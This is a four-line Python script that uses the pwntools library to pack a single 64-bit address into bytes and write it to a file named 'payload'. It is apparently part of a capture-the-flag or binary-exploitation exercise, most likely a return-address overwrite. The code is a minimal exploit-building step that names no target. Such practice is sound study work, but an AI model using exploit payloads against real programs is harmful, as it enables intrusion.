from pwn import *

payload = p64(0x00000000004011a0)

write("payload",payload)